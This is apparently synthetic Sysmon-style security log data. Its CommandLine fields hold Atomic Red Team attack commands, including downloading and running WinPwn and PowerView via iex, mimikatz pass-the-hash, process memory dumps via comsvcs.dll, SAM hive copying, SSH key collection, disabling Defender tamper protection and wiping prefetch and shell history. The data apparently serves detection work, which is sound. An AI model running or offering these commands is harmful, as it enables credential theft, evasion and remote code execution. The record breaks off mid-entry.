    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-08.taylor-turner.com",
        "User": "kvargas",
        "ProcessID": 8593,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo echo osascript -e 'tell app \\\"Finder\\\" to display dialog \\\"Hello World\\\"' >> /etc/rc.common\\n\",",
        "LogonID": 658214,
        "LogonGuid": "2751eda5-869d-421f-8de8-51f70ca704bd",
        "SourceProcessID": 4488,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\civil..exe",
        "DestinationProcessID": 8893,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\leader..exe",
        "UtcTime": "2024-05-17T01:36:51.826522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-97.taylor-griffin.com",
        "User": "stacyhoward",
        "ProcessID": 6782,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsamfile -consoleoutput -noninteractive  \",",
        "LogonID": 569230,
        "LogonGuid": "b9320ca7-b6f2-448d-9b1c-3bfcebd52d29",
        "SourceProcessID": 3515,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\own..exe",
        "DestinationProcessID": 8015,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\mother..exe",
        "UtcTime": "2024-05-17T01:36:51.826522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-17.diaz.org",
        "User": "schneiderrachel",
        "ProcessID": 4459,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"ln -sf /dev/null #{history_path}\\n\",",
        "LogonID": 971180,
        "LogonGuid": "1bc38f6f-05f6-4ca8-9df6-a22ba5705efd",
        "SourceProcessID": 2358,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\system..dll",
        "DestinationProcessID": 3323,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\month..exe",
        "UtcTime": "2024-05-17T01:36:51.826522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-43.gray-lowery.info",
        "User": "petersdavid",
        "ProcessID": 8527,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\T1546.011CompatDatabase.sdb\\\" C:\\\\Windows\\\\apppatch\\\\Custom\\\\T1546.011CompatDatabase.sdb\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\T1546.011CompatDatabase.sdb\\\" C:\\\\Windows\\\\apppatch\\\\Custom\\\\Custom64\\\\T1546.011CompatDatabase.sdb\\n\",",
        "LogonID": 153904,
        "LogonGuid": "9261c44c-c3e5-44de-976a-d73ce2fcefb4",
        "SourceProcessID": 3238,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\wish..exe",
        "DestinationProcessID": 1271,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\final..dll",
        "UtcTime": "2024-05-17T01:36:51.827521Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-63.ramos-sanders.biz",
        "User": "sandra98",
        "ProcessID": 8881,
        "ProcessName": "nc.exe",
        "CommandLine": "\"export ART='echo \\\"Atomic Red Team was here... T1059.004\\\"'\\necho $ART |/bin/sh\\n\",",
        "LogonID": 704085,
        "LogonGuid": "f0e73899-9b11-4b3d-999b-ffca6e9cc9ac",
        "SourceProcessID": 2651,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\network..dll",
        "DestinationProcessID": 4563,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\marriage..exe",
        "UtcTime": "2024-05-17T01:36:51.827521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-33.quinn.com",
        "User": "michaelmorris",
        "ProcessID": 3827,
        "ProcessName": "malware.exe",
        "CommandLine": "\"sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin\",",
        "LogonID": 438073,
        "LogonGuid": "ea86d648-ea76-44e2-be15-59b0212772e4",
        "SourceProcessID": 4490,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\Mr..exe",
        "DestinationProcessID": 2053,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\which..exe",
        "UtcTime": "2024-05-17T01:36:51.827521Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-15.richards-hendricks.com",
        "User": "daltonemily",
        "ProcessID": 2887,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\\n\",",
        "LogonID": 775219,
        "LogonGuid": "1930579a-1c4e-4e55-980f-5725128404f5",
        "SourceProcessID": 8666,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\again..exe",
        "DestinationProcessID": 2468,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\tonight..exe",
        "UtcTime": "2024-05-17T01:36:51.827521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-20.lawrence-lester.com",
        "User": "gmartinez",
        "ProcessID": 1260,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sudo tmutil disable\",",
        "LogonID": 455175,
        "LogonGuid": "e6473529-1408-40a3-adcd-e8580e36e076",
        "SourceProcessID": 1014,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\lawyer..exe",
        "DestinationProcessID": 9751,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\gun..dll",
        "UtcTime": "2024-05-17T01:36:51.827521Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-02.sanchez.com",
        "User": "tyler18",
        "ProcessID": 5523,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}\",",
        "LogonID": 686335,
        "LogonGuid": "4aed3ec0-ac48-4830-91ea-85c55d39cf43",
        "SourceProcessID": 5215,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\fact..dll",
        "DestinationProcessID": 8402,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\very..dll",
        "UtcTime": "2024-05-17T01:36:51.828521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-95.barrett-garrett.org",
        "User": "sarah83",
        "ProcessID": 9432,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultUserName -Value Administrator -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultDomainName -Value contoso.com -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultPassword  -Value password1 -Force\\n\",",
        "LogonID": 963858,
        "LogonGuid": "49632db7-caa8-40d1-b758-d17cf1b691b7",
        "SourceProcessID": 1073,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\project..dll",
        "DestinationProcessID": 4619,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\gas..exe",
        "UtcTime": "2024-05-17T01:36:51.828521Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-53.duarte-harper.com",
        "User": "gibbsemily",
        "ProcessID": 4478,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo #{compiled_file} #{source_file}\\n\",",
        "LogonID": 564083,
        "LogonGuid": "f5829595-e28a-4096-ae46-90f4183c8af9",
        "SourceProcessID": 1326,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\cultural..exe",
        "DestinationProcessID": 6553,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\near..dll",
        "UtcTime": "2024-05-17T01:36:51.828521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-43.sutton.info",
        "User": "dclark",
        "ProcessID": 6998,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cmdkey /list\\n\",",
        "LogonID": 888993,
        "LogonGuid": "e4706481-1704-4904-b858-9896163ed491",
        "SourceProcessID": 1871,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\worry..exe",
        "DestinationProcessID": 1060,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\trouble..dll",
        "UtcTime": "2024-05-17T01:36:51.828521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-77.garza.com",
        "User": "wyatt09",
        "ProcessID": 4128,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"mkdir #{output_folder}\\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\\\;\\n\",",
        "LogonID": 381059,
        "LogonGuid": "8a03032d-8aea-438b-882b-f279bc4f0b4b",
        "SourceProcessID": 1799,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\loss..exe",
        "DestinationProcessID": 7405,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\hand..dll",
        "UtcTime": "2024-05-17T01:36:51.828521Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-04.gomez-mcgee.com",
        "User": "hmckinney",
        "ProcessID": 2498,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"echo \\\"block in proto tcp from 1.2.3.4 to any\\\" | pfctl -a pf-rules -f -\\npfctl -a pf-rules -s rules\\n\",",
        "LogonID": 114539,
        "LogonGuid": "c6a83e50-0977-4218-9031-2be504473cea",
        "SourceProcessID": 7764,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\yard..exe",
        "DestinationProcessID": 9490,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\professional..exe",
        "UtcTime": "2024-05-17T01:36:51.829521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-71.gomez.biz",
        "User": "lisarhodes",
        "ProcessID": 9462,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"echo \\\"Creating %systemroot%\\\\wpbbin.exe\\\"      \\nNew-Item -ItemType File -Path \\\"$env:SystemRoot\\\\System32\\\\wpbbin.exe\\\"\\n\",",
        "LogonID": 235432,
        "LogonGuid": "2c281770-110f-4f19-b8fb-6b0dd4b54319",
        "SourceProcessID": 2363,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\already..dll",
        "DestinationProcessID": 2436,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\character..dll",
        "UtcTime": "2024-05-17T01:36:51.829521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-26.garcia.com",
        "User": "karen37",
        "ProcessID": 4735,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features\\\" /v \\\"TamperProtection\\\" /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 936688,
        "LogonGuid": "9bdc709c-dec5-4849-96a2-b3104321877a",
        "SourceProcessID": 7242,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\face..exe",
        "DestinationProcessID": 1307,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\rule..dll",
        "UtcTime": "2024-05-17T01:36:51.829521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-69.wright-johnson.net",
        "User": "johngreen",
        "ProcessID": 4320,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$syntaxList = #{syntax}\\nforeach ($syntax in $syntaxList) {\\n#{SharpView} $syntax -}\\n\",",
        "LogonID": 622219,
        "LogonGuid": "263c4fbe-a51e-48e3-b4e2-a57a345ae90f",
        "SourceProcessID": 3395,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\magazine..dll",
        "DestinationProcessID": 9619,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\bad..exe",
        "UtcTime": "2024-05-17T01:36:51.829521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-84.ramos.com",
        "User": "kellyturner",
        "ProcessID": 2432,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Enable-PSRemoting -Force\\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}\",",
        "LogonID": 541748,
        "LogonGuid": "2784c9dd-660e-4c98-918d-6d994ab8fc04",
        "SourceProcessID": 3527,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\give..dll",
        "DestinationProcessID": 5304,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\account..exe",
        "UtcTime": "2024-05-17T01:36:51.829521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-69.bennett-prince.com",
        "User": "michaelprice",
        "ProcessID": 4597,
        "ProcessName": "nc.exe",
        "CommandLine": "\"echo \\\"block in proto tcp from 1.2.3.4 to any\\\" | pfctl -a pf-rules -f -\\npfctl -a pf-rules -s rules\\n\",",
        "LogonID": 627813,
        "LogonGuid": "50b0e60e-b1e8-47a4-8715-4a4d59b21114",
        "SourceProcessID": 4651,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\capital..exe",
        "DestinationProcessID": 7499,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\lead..exe",
        "UtcTime": "2024-05-17T01:36:51.830522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-07.anderson.com",
        "User": "dennisallen",
        "ProcessID": 7185,
        "ProcessName": "nc.exe",
        "CommandLine": "\"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \\\"Droplet\\\\|HVM\\\\|VirtualBox\\\\|VMware\\\"; fi\\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \\\"Xen\\\\|Bochs\\\\|QEMU\\\"; fi\\nif [ -x \\\"$(command -v dmidecode)\\\" ]; then sudo dmidecode | grep -i \\\"microsoft\\\\|vmware\\\\|virtualbox\\\\|quemu\\\\|domu\\\"; fi\\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \\\"vmware\\\\|vbox\\\"; fi\\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \\\"vmware\\\\|vbox\\\\|qemu\\\\|virtual\\\"; fi\\nif [ -x \\\"$(command -v lspci)\\\" ]; then sudo lspci | grep -i \\\"vmware\\\\|virtualbox\\\"; fi\\nif [ -x \\\"$(command -v lscpu)\\\" ]; then sudo lscpu | grep -i \\\"Xen\\\\|KVM\\\\|Microsoft\\\"; fi\\n\",",
        "LogonID": 843819,
        "LogonGuid": "4e0d3a34-967c-45b7-a96e-d511f372e3ba",
        "SourceProcessID": 5109,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\foreign..exe",
        "DestinationProcessID": 3991,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\summer..exe",
        "UtcTime": "2024-05-17T01:36:51.830522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-21.hendricks-allen.com",
        "User": "nmason",
        "ProcessID": 2481,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"del %TEMP%\\\\redcanary.cab >nul 2>&1\\n#{Path_replace} #{replace_cab} %TEMP% /A\\n\",",
        "LogonID": 155768,
        "LogonGuid": "8cac7d33-1892-4885-93c2-89640af3ae82",
        "SourceProcessID": 7359,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\become..dll",
        "DestinationProcessID": 4907,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\and..dll",
        "UtcTime": "2024-05-17T01:36:51.830522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-78.evans-yu.com",
        "User": "michael85",
        "ProcessID": 6077,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"rm -f #{file_to_delete}\\n\",",
        "LogonID": 979038,
        "LogonGuid": "c02847eb-3668-404f-958f-a416a0c69d86",
        "SourceProcessID": 7490,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\product..dll",
        "DestinationProcessID": 2410,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\structure..dll",
        "UtcTime": "2024-05-17T01:36:51.830522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-56.hebert.com",
        "User": "barronabigail",
        "ProcessID": 5827,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg.exe add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Provisioning\\\\Commands\\\\LOLBin\\\\dummy1 /v altitude /t REG_DWORD /d 0\\nreg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Provisioning\\\\Commands\\\\LOLBin\\\\dummy1\\\\dummy2 /v Commandline /d calc.exe\\nc:\\\\windows\\\\system32\\\\provlaunch.exe LOLBin\\n\",",
        "LogonID": 910109,
        "LogonGuid": "65bacefe-ee6f-4096-93eb-021a450642c9",
        "SourceProcessID": 6133,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\turn..exe",
        "DestinationProcessID": 1713,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\water..exe",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-53.griffin-sherman.com",
        "User": "christopher85",
        "ProcessID": 4546,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\\nC:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump $id $env:TEMP\\\\svchost-exe.dmp full\\n\",",
        "LogonID": 762259,
        "LogonGuid": "9bffe782-0b0d-410b-a981-4c7ed6350ca9",
        "SourceProcessID": 6410,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\close..exe",
        "DestinationProcessID": 6324,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\day..exe",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-02.khan.org",
        "User": "harringtonpamela",
        "ProcessID": 6186,
        "ProcessName": "nc.exe",
        "CommandLine": "\"powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\\npowershell Get-WmiObject -Namespace root\\\\securitycenter2 -Class antivirusproduct\\n\",",
        "LogonID": 537143,
        "LogonGuid": "875cd4b2-f824-4d33-a1c2-6ce0267a7cc1",
        "SourceProcessID": 3031,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\rest..dll",
        "DestinationProcessID": 1307,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\agency..dll",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-01.hughes.com",
        "User": "carlsonkaren",
        "ProcessID": 9340,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"hh.exe -decompile %temp% \\\"#{local_chm_file}\\\"\\n\",",
        "LogonID": 884479,
        "LogonGuid": "0b8b4632-175a-4245-abc5-1b691e7da890",
        "SourceProcessID": 8305,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\adult..exe",
        "DestinationProcessID": 6087,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\its..dll",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-09.griffin.org",
        "User": "lrobinson",
        "ProcessID": 4057,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Remove-Item -Path (Join-Path \\\"$Env:SystemRoot\\\\prefetch\\\\\\\" (Get-ChildItem -Path \\\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\\" -Name)[0])\\n\",",
        "LogonID": 421314,
        "LogonGuid": "24ded671-885a-4502-890c-ee0bfa65cf2c",
        "SourceProcessID": 6912,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\similar..exe",
        "DestinationProcessID": 3570,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\two..exe",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-44.davis.com",
        "User": "sarahlawson",
        "ProcessID": 8292,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 391293,
        "LogonGuid": "92b63e9b-8aca-49fc-8558-ddf82103e288",
        "SourceProcessID": 9256,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\cover..dll",
        "DestinationProcessID": 5698,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\billion..dll",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-95.bates.com",
        "User": "zhartman",
        "ProcessID": 3290,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"#{mimikatz_path} \\\"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\\\"\\n\",",
        "LogonID": 267507,
        "LogonGuid": "082578e3-7e16-4dd2-851b-f360e816c6f7",
        "SourceProcessID": 6651,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\customer..dll",
        "DestinationProcessID": 5110,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\very..exe",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-71.barber.com",
        "User": "melissanorris",
        "ProcessID": 3450,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"1..#{limit} | % { \\n try { [System.IO.File]::Copy(\\\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy$_\\\\Windows\\\\System32\\\\config\\\\#{target_hive}\\\" , \\\"$env:TEMP\\\\#{target_hive}vss$_\\\", \\\"true\\\") } catch {}\\n ls \\\"$env:TEMP\\\\#{target_hive}vss$_\\\" -ErrorAction Ignore\\n}\\n\",",
        "LogonID": 545717,
        "LogonGuid": "406cbdeb-14e9-4a75-95ae-81cc7c08eded",
        "SourceProcessID": 4545,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\compare..dll",
        "DestinationProcessID": 8310,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\those..dll",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-44.nicholson-hudson.com",
        "User": "linda02",
        "ProcessID": 6681,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\\n\",",
        "LogonID": 938063,
        "LogonGuid": "929174ef-0e84-4b40-b485-e8628bc5f271",
        "SourceProcessID": 7917,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\drop..dll",
        "DestinationProcessID": 4448,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\note..dll",
        "UtcTime": "2024-05-17T01:36:51.831522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-04.santiago.com",
        "User": "hendersondennis",
        "ProcessID": 8100,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cat /etc/shells \\n\",",
        "LogonID": 963072,
        "LogonGuid": "d793fae8-2754-4aba-aa72-fe59b971bdd2",
        "SourceProcessID": 9653,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\within..exe",
        "DestinationProcessID": 1142,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\election..exe",
        "UtcTime": "2024-05-17T01:36:51.833029Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-45.reilly-anderson.com",
        "User": "adam46",
        "ProcessID": 1868,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"wuauclt.exe /UpdateDeploymentProvider \\\"#{arbitrary_dll}\\\" /RunHandlerComServer\\n\",",
        "LogonID": 627319,
        "LogonGuid": "bf2c2677-8132-42a4-8dee-ca6a23031fb7",
        "SourceProcessID": 2007,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\edge..exe",
        "DestinationProcessID": 4559,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\service..dll",
        "UtcTime": "2024-05-17T01:36:51.833029Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-46.taylor.com",
        "User": "walterporter",
        "ProcessID": 2950,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"ip tcp_metrics show |grep --invert-match \\\"^127\\\\.\\\"\\n\",",
        "LogonID": 670273,
        "LogonGuid": "39267f80-e274-4a84-a3d3-d0eb59c6d364",
        "SourceProcessID": 7360,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\tonight..dll",
        "DestinationProcessID": 9270,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\list..exe",
        "UtcTime": "2024-05-17T01:36:51.833029Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-76.arnold-crawford.com",
        "User": "sarahbonilla",
        "ProcessID": 4344,
        "ProcessName": "malware.exe",
        "CommandLine": "\"mkdir $HOME/...\\ncp $(which sh) $HOME/...\\n$HOME/.../sh -c \\\"echo #{test_message}\\\"\\n\",",
        "LogonID": 159878,
        "LogonGuid": "32ac6dab-29ed-4451-9e93-929c52c0c631",
        "SourceProcessID": 6661,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\need..dll",
        "DestinationProcessID": 3039,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\economic..dll",
        "UtcTime": "2024-05-17T01:36:51.833029Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-94.ramirez.com",
        "User": "carpentergeorge",
        "ProcessID": 4365,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsamfile -consoleoutput -noninteractive  \",",
        "LogonID": 672160,
        "LogonGuid": "84cd3232-c16e-4ccd-9c53-49069c8ebfc2",
        "SourceProcessID": 4241,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\remain..exe",
        "DestinationProcessID": 8618,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\election..exe",
        "UtcTime": "2024-05-17T01:36:51.834038Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-12.paul.com",
        "User": "stephanieschneider",
        "ProcessID": 4020,
        "ProcessName": "mimikatz.exe",
